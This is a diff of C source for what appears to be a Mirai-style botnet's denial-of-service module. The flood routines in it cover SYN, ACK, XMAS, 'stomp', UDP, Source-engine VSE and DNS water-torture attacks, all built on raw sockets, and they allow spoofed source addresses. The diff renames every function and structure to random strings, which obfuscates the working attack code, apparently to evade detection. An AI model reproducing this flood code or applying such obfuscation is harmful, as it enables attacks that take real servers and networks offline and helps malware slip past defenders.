@@ -22,19 +22,19 @@
 #define table_lock_val(x) ((void)0)
 
 /* VSE query payload: TSource Engine Query */
-static char _vse_payload[] = "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00";
-static int _vse_payload_len = 25;
+static char _kP4zM4s[] = "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00";
+static int _LG7Ei7w = 25;
 #define TABLE_ATK_VSE 0
-static char *table_retrieve_val(int id, int *out_len) { if (out_len) *out_len = _vse_payload_len; return _vse_payload; }
+static char *_pt7BS3i(int id, int *out_len) { if (out_len) *out_len = _LG7Ei7w; return _kP4zM4s; }
 
 /* DNS resolver path + nameserver label */
 #define TABLE_ATK_RESOLVER 1
 #define TABLE_ATK_NSERV 2
-static ipv4_t get_dns_resolver(void);
+static ipv4_t _hU2VN8X(void);
 
 /* ===== Helper functions ===== */
 
-static int atk_open_raw(int protocol)
+static int _ES7Jr7U(int protocol)
 {
     int fd, one = 1;
     fd = socket(AF_INET, SOCK_RAW, protocol);
@@ -44,7 +44,7 @@ static int atk_open_raw(int protocol)
     return fd;
 }
 
-static void atk_init_ip(struct iphdr *iph, uint8_t tos, uint16_t ident,
+static void _mu3nA8m(struct iphdr *iph, uint8_t tos, uint16_t ident,
                          uint8_t ttl, BOOL dont_frag, uint8_t protocol,
                          uint32_t saddr, uint32_t daddr, uint16_t tot_len)
 {
@@ -61,7 +61,7 @@ static void atk_init_ip(struct iphdr *iph, uint8_t tos, uint16_t ident,
     iph->daddr = daddr;
 }
 
-static void atk_write_tcp_opts(uint8_t *opts)
+static void _PV8QK6Y(uint8_t *opts)
 {
     *opts++ = PROTO_TCP_OPT_MSS;
     *opts++ = 4;
@@ -83,8 +83,8 @@ static void atk_write_tcp_opts(uint8_t *opts)
 
 /* ===== TCP-with-options shared implementation (tcpsyn/ovh/tcpusyn/tcpall/tcpfrag/asyn) ===== */
 
-static void attack_method_tcp_opts_impl(uint8_t targs_len, struct attack_target *targs,
-    uint8_t opts_len, struct attack_option *opts,
+static void NC5iv2R(uint8_t targs_len, struct _Lw2SW5p *targs,
+    uint8_t opts_len, struct _ak3Jy6Y *opts,
     BOOL d_urg, BOOL d_ack, BOOL d_psh, BOOL d_rst, BOOL d_syn, BOOL d_fin,
     BOOL d_df, uint32_t d_ack_val)
 {
@@ -100,23 +100,23 @@ static void attack_method_tcp_opts_impl(uint8_t targs_len, struct attack_target 
     pkts = calloc(targs_len, sizeof(char *));
     if (!pkts) return;
 
-    ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
-    ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
-    ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
-    dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, d_df);
-    sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
-    seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
-    ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, d_ack_val);
-    urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, d_urg);
-    ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, d_ack);
-    psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, d_psh);
-    rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, d_rst);
-    syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, d_syn);
-    fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, d_fin);
-    source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
+    ip_tos = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TOS, 0);
+    ip_ident = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
+    ip_ttl = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TTL, 64);
+    dont_frag = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_DF, d_df);
+    sport = Cn6pZ7t(opts_len, opts, ATK_OPT_SPORT, 0xffff);
+    dport = Cn6pZ7t(opts_len, opts, ATK_OPT_DPORT, 0xffff);
+    seq = Cn6pZ7t(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
+    ack = Cn6pZ7t(opts_len, opts, ATK_OPT_ACKRND, d_ack_val);
+    urg_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_URG, d_urg);
+    ack_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_ACK, d_ack);
+    psh_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_PSH, d_psh);
+    rst_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_RST, d_rst);
+    syn_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_SYN, d_syn);
+    fin_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_FIN, d_fin);
+    source_ip = qM3bi3n(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
 
-    fd = atk_open_raw(IPPROTO_TCP);
+    fd = _ES7Jr7U(IPPROTO_TCP);
     if (fd == -1) return;
 
     for (i = 0; i < targs_len; i++)
@@ -129,7 +129,7 @@ static void attack_method_tcp_opts_impl(uint8_t targs_len, struct attack_target 
         iph = (struct iphdr *)pkts[i];
         tcph = (struct tcphdr *)(iph + 1);
         tcp_opts = (uint8_t *)(tcph + 1);
-        atk_init_ip(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_TCP,
+        _mu3nA8m(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_TCP,
                      source_ip, targs[i].addr,
                      sizeof(struct iphdr) + sizeof(struct tcphdr) + 20);
         tcph->source = htons(sport);
@@ -142,7 +142,7 @@ static void attack_method_tcp_opts_impl(uint8_t targs_len, struct attack_target 
         tcph->rst = rst_fl;
         tcph->syn = syn_fl;
         tcph->fin = fin_fl;
-        atk_write_tcp_opts(tcp_opts);
+        _PV8QK6Y(tcp_opts);
     }
     while (TRUE)
     {
@@ -177,51 +177,51 @@ static void attack_method_tcp_opts_impl(uint8_t targs_len, struct attack_target 
     }
 }
 
-void attack_method_tcpsyn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+void zH8AM3C(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
 {
-    attack_method_tcp_opts_impl(targs_len, targs, opts_len, opts,
+    NC5iv2R(targs_len, targs, opts_len, opts,
         FALSE, FALSE, FALSE, FALSE, TRUE, FALSE, TRUE, 0);
 }
 
-void attack_method_ovh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+void hF5fe6z(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
 {
-    attack_method_tcp_opts_impl(targs_len, targs, opts_len, opts,
+    NC5iv2R(targs_len, targs, opts_len, opts,
         FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, TRUE, 0);
 }
 
-void attack_method_tcpusyn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+void EA6XQ6C(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
 {
-    attack_method_tcp_opts_impl(targs_len, targs, opts_len, opts,
+    NC5iv2R(targs_len, targs, opts_len, opts,
         TRUE, FALSE, FALSE, FALSE, TRUE, FALSE, TRUE, 0);
 }
 
-void attack_method_tcpall(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+void Hs2Ny8u(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
 {
-    attack_method_tcp_opts_impl(targs_len, targs, opts_len, opts,
+    NC5iv2R(targs_len, targs, opts_len, opts,
         TRUE, TRUE, TRUE, TRUE, TRUE, TRUE, TRUE, 0);
 }
 
-void attack_method_tcpfrag(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+void as6WA6q(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
 {
-    attack_method_tcp_opts_impl(targs_len, targs, opts_len, opts,
+    NC5iv2R(targs_len, targs, opts_len, opts,
         TRUE, TRUE, TRUE, TRUE, TRUE, TRUE, FALSE, 0);
 }
 
-void attack_method_asyn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+void Db5Ym3u(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
 {
-    attack_method_tcp_opts_impl(targs_len, targs, opts_len, opts,
+    NC5iv2R(targs_len, targs, opts_len, opts,
         FALSE, TRUE, FALSE, FALSE, TRUE, FALSE, TRUE, 0);
 }
 
 /* ===== stomp/xmas shared implementation ===== */
 
-static void attack_method_stomp_xmas_impl(uint8_t targs_len, struct attack_target *targs,
-    uint8_t opts_len, struct attack_option *opts,
+static void zy3Pc3K(uint8_t targs_len, struct _Lw2SW5p *targs,
+    uint8_t opts_len, struct _ak3Jy6Y *opts,
     BOOL d_urg, BOOL d_ack, BOOL d_psh, BOOL d_rst, BOOL d_syn, BOOL d_fin,
     int d_data_len)
 {
     int i, rfd;
-    struct attack_stomp_data *conn_data;
+    struct _jF5vX4i *conn_data;
     char **pkts;
     uint8_t ip_tos, ip_ttl;
     uint16_t ip_ident;
@@ -231,25 +231,25 @@ static void attack_method_stomp_xmas_impl(uint8_t targs_len, struct attack_targe
     int data_len;
     BOOL data_rand;
 
-    conn_data = calloc(targs_len, sizeof(struct attack_stomp_data));
+    conn_data = calloc(targs_len, sizeof(struct _jF5vX4i));
     pkts = calloc(targs_len, sizeof(char *));
     if (!conn_data || !pkts) return;
 
-    ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
-    ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
-    ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
-    dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
-    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
-    urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, d_urg);
-    ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, d_ack);
-    psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, d_psh);
-    rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, d_rst);
-    syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, d_syn);
-    fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, d_fin);
-    data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, d_data_len);
-    data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
+    ip_tos = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TOS, 0);
+    ip_ident = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
+    ip_ttl = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TTL, 64);
+    dont_frag = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_DF, TRUE);
+    dport = Cn6pZ7t(opts_len, opts, ATK_OPT_DPORT, 0xffff);
+    urg_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_URG, d_urg);
+    ack_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_ACK, d_ack);
+    psh_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_PSH, d_psh);
+    rst_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_RST, d_rst);
+    syn_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_SYN, d_syn);
+    fin_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_FIN, d_fin);
+    data_len = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, d_data_len);
+    data_rand = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
 
-    rfd = atk_open_raw(IPPROTO_TCP);
+    rfd = _ES7Jr7U(IPPROTO_TCP);
     if (rfd == -1) return;
 
     for (i = 0; i < targs_len; i++)
@@ -309,7 +309,7 @@ static void attack_method_stomp_xmas_impl(uint8_t targs_len, struct attack_targe
                             iph = (struct iphdr *)pkts[i];
                             tcph2 = (struct tcphdr *)(iph + 1);
                             payload = (char *)(tcph2 + 1);
-                            atk_init_ip(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_TCP,
+                            _mu3nA8m(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_TCP,
                                          LOCAL_ADDR, conn_data[i].addr,
                                          sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
                             tcph2->source = conn_data[i].sport;
@@ -369,22 +369,22 @@ static void attack_method_stomp_xmas_impl(uint8_t targs_len, struct attack_targe
     }
 }
 
-void attack_method_tcpstomp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+void Jr5JL6d(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
 {
-    attack_method_stomp_xmas_impl(targs_len, targs, opts_len, opts,
+    zy3Pc3K(targs_len, targs, opts_len, opts,
         FALSE, TRUE, TRUE, FALSE, FALSE, FALSE, 768);
 }
 
-void attack_method_tcpxmas(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+void Tn8aH6f(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
 {
-    attack_method_stomp_xmas_impl(targs_len, targs, opts_len, opts,
+    zy3Pc3K(targs_len, targs, opts_len, opts,
         TRUE, TRUE, TRUE, TRUE, TRUE, TRUE, 768);
 }
 
 /* ===== UDP connected shared implementation (std/udpplain) ===== */
 
-static void attack_method_udp_connected_impl(uint8_t targs_len, struct attack_target *targs,
-    uint8_t opts_len, struct attack_option *opts,
+static void _AV8og7H(uint8_t targs_len, struct _Lw2SW5p *targs,
+    uint8_t opts_len, struct _ak3Jy6Y *opts,
     int d_data_len, int sock_proto)
 {
     int i;
@@ -399,10 +399,10 @@ static void attack_method_udp_connected_impl(uint8_t targs_len, struct attack_ta
     fds = calloc(targs_len, sizeof(int));
     if (!pkts || !fds) return;
 
-    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
-    sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, d_data_len);
-    data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
+    dport = Cn6pZ7t(opts_len, opts, ATK_OPT_DPORT, 0xffff);
+    sport = Cn6pZ7t(opts_len, opts, ATK_OPT_SPORT, 0xffff);
+    data_len = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, d_data_len);
+    data_rand = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
 
     if (sport == 0xffff)
     {
@@ -448,19 +448,19 @@ static void attack_method_udp_connected_impl(uint8_t targs_len, struct attack_ta
     }
 }
 
-void attack_method_std(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+void jG6oM6K(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
 {
-    attack_method_udp_connected_impl(targs_len, targs, opts_len, opts, 1024, 0);
+    _AV8og7H(targs_len, targs, opts_len, opts, 1024, 0);
 }
 
-void attack_method_udpplain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+void bx3we8X(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
 {
-    attack_method_udp_connected_impl(targs_len, targs, opts_len, opts, 512, IPPROTO_UDP);
+    _AV8og7H(targs_len, targs, opts_len, opts, 512, IPPROTO_UDP);
 }
 
 /* ===== tcpack ===== */
 
-void attack_method_tcpack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+void gj7Ru2o(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
 {
     int i, fd;
     char **pkts;
@@ -476,25 +476,25 @@ void attack_method_tcpack(uint8_t targs_len, struct attack_target *targs, uint8_
     pkts = calloc(targs_len, sizeof(char *));
     if (!pkts) return;
 
-    ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
-    ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
-    ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
-    dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
-    sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
-    seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
-    ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0xffff);
-    urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
-    ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
-    psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
-    rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
-    syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
-    fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
-    data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
-    data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
-    source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
+    ip_tos = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TOS, 0);
+    ip_ident = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
+    ip_ttl = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TTL, 64);
+    dont_frag = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_DF, FALSE);
+    sport = Cn6pZ7t(opts_len, opts, ATK_OPT_SPORT, 0xffff);
+    dport = Cn6pZ7t(opts_len, opts, ATK_OPT_DPORT, 0xffff);
+    seq = Cn6pZ7t(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
+    ack = Cn6pZ7t(opts_len, opts, ATK_OPT_ACKRND, 0xffff);
+    urg_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_URG, FALSE);
+    ack_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_ACK, TRUE);
+    psh_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_PSH, FALSE);
+    rst_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_RST, FALSE);
+    syn_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_SYN, FALSE);
+    fin_fl = Cn6pZ7t(opts_len, opts, ATK_OPT_FIN, FALSE);
+    data_len = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
+    data_rand = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
+    source_ip = qM3bi3n(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
 
-    fd = atk_open_raw(IPPROTO_TCP);
+    fd = _ES7Jr7U(IPPROTO_TCP);
     if (fd == -1) return;
 
     for (i = 0; i < targs_len; i++)
@@ -507,7 +507,7 @@ void attack_method_tcpack(uint8_t targs_len, struct attack_target *targs, uint8_
         iph = (struct iphdr *)pkts[i];
         tcph = (struct tcphdr *)(iph + 1);
         payload = (char *)(tcph + 1);
-        atk_init_ip(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_TCP,
+        _mu3nA8m(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_TCP,
                      source_ip, targs[i].addr,
                      sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
         tcph->source = htons(sport);
@@ -561,7 +561,7 @@ void attack_method_tcpack(uint8_t targs_len, struct attack_target *targs, uint8_
 
 /* ===== udpgeneric ===== */
 
-void attack_method_udpgeneric(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+void Tv3eT5t(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
 {
     int i, fd;
     char **pkts;
@@ -574,19 +574,19 @@ void attack_method_udpgeneric(uint8_t targs_len, struct attack_target *targs, ui
     pkts = calloc(targs_len, sizeof(char *));
     if (!pkts) return;
 
-    ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
-    ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
-    ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
-    dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
-    sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
-    data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
-    data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
-    source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
+    ip_tos = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TOS, 0);
+    ip_ident = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
+    ip_ttl = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TTL, 64);
+    dont_frag = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_DF, FALSE);
+    sport = Cn6pZ7t(opts_len, opts, ATK_OPT_SPORT, 0xffff);
+    dport = Cn6pZ7t(opts_len, opts, ATK_OPT_DPORT, 0xffff);
+    data_len = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
+    data_rand = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
+    source_ip = Cn6pZ7t(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
     if (data_len > 1460)
         data_len = 1460;
 
-    fd = atk_open_raw(IPPROTO_UDP);
+    fd = _ES7Jr7U(IPPROTO_UDP);
     if (fd == -1) return;
 
     for (i = 0; i < targs_len; i++)
@@ -597,7 +597,7 @@ void attack_method_udpgeneric(uint8_t targs_len, struct attack_target *targs, ui
         if (!pkts[i]) { close(fd); return; }
         iph = (struct iphdr *)pkts[i];
         udph = (struct udphdr *)(iph + 1);
-        atk_init_ip(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_UDP,
+        _mu3nA8m(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_UDP,
                      source_ip, targs[i].addr,
                      sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
         udph->source = htons(sport);
@@ -636,7 +636,7 @@ void attack_method_udpgeneric(uint8_t targs_len, struct attack_target *targs, ui
 
 /* ===== udpvse ===== */
 
-void attack_method_udpvse(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+void gb2ob7U(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
 {
     int i, fd;
     char **pkts;
@@ -650,16 +650,16 @@ void attack_method_udpvse(uint8_t targs_len, struct attack_target *targs, uint8_
     pkts = calloc(targs_len, sizeof(char *));
     if (!pkts) return;
 
-    ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
-    ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
-    ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
-    dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
-    sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 27015);
+    ip_tos = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TOS, 0);
+    ip_ident = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
+    ip_ttl = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TTL, 64);
+    dont_frag = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_DF, FALSE);
+    sport = Cn6pZ7t(opts_len, opts, ATK_OPT_SPORT, 0xffff);
+    dport = Cn6pZ7t(opts_len, opts, ATK_OPT_DPORT, 27015);
     table_unlock_val(TABLE_ATK_VSE);
-    vse_payload = table_retrieve_val(TABLE_ATK_VSE, &vse_payload_len);
+    vse_payload = _pt7BS3i(TABLE_ATK_VSE, &vse_payload_len);
 
-    fd = atk_open_raw(IPPROTO_UDP);
+    fd = _ES7Jr7U(IPPROTO_UDP);
     if (fd == -1) return;
 
     for (i = 0; i < targs_len; i++)
@@ -672,7 +672,7 @@ void attack_method_udpvse(uint8_t targs_len, struct attack_target *targs, uint8_
         iph = (struct iphdr *)pkts[i];
         udph = (struct udphdr *)(iph + 1);
         data = (char *)(udph + 1);
-        atk_init_ip(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_UDP,
+        _mu3nA8m(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_UDP,
                      LOCAL_ADDR, targs[i].addr,
                      sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len);
         udph->source = htons(sport);
@@ -709,7 +709,7 @@ void attack_method_udpvse(uint8_t targs_len, struct attack_target *targs, uint8_
 
 /* ===== udpdns ===== */
 
-void attack_method_udpdns(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+void Fq5Mk7Y(uint8_t targs_len, struct _Lw2SW5p *targs, uint8_t opts_len, struct _ak3Jy6Y *opts)
 {
     int i, fd;
     char **pkts;
@@ -724,16 +724,16 @@ void attack_method_udpdns(uint8_t targs_len, struct attack_target *targs, uint8_
     pkts = calloc(targs_len, sizeof(char *));
     if (!pkts) return;
 
-    ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
-    ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
-    ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
-    dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
-    sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 53);
-    dns_hdr_id = attack_get_opt_int(opts_len, opts, ATK_OPT_DNS_HDR_ID, 0xffff);
-    data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 12);
-    domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
-    dns_resolver = get_dns_resolver();
+    ip_tos = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TOS, 0);
+    ip_ident = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
+    ip_ttl = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_TTL, 64);
+    dont_frag = Cn6pZ7t(opts_len, opts, ATK_OPT_IP_DF, FALSE);
+    sport = Cn6pZ7t(opts_len, opts, ATK_OPT_SPORT, 0xffff);
+    dport = Cn6pZ7t(opts_len, opts, ATK_OPT_DPORT, 53);
+    dns_hdr_id = Cn6pZ7t(opts_len, opts, ATK_OPT_DNS_HDR_ID, 0xffff);
+    data_len = Cn6pZ7t(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 12);
+    domain = Gm8Th7P(opts_len, opts, ATK_OPT_DOMAIN, NULL);
+    dns_resolver = _hU2VN8X();
 
     if (domain == NULL)
     {
@@ -741,7 +741,7 @@ void attack_method_udpdns(uint8_t targs_len, struct attack_target *targs, uint8_
     }
     domain_len = util_strlen(domain);
 
-    fd = atk_open_raw(IPPROTO_UDP);
+    fd = _ES7Jr7U(IPPROTO_UDP);
     if (fd == -1) return;
 
     for (i = 0; i < targs_len; i++)
@@ -759,7 +759,7 @@ void attack_method_udpdns(uint8_t targs_len, struct attack_target *targs, uint8_
         udph = (struct udphdr *)(iph + 1);
         dnsh = (struct dnshdr *)(udph + 1);
         qname = (char *)(dnsh + 1);
-        atk_init_ip(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_UDP,
+        _mu3nA8m(iph, ip_tos, ip_ident, ip_ttl, dont_frag, IPPROTO_UDP,
                      LOCAL_ADDR, dns_resolver,
                      sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof(struct dns_question));
         udph->source = htons(sport);
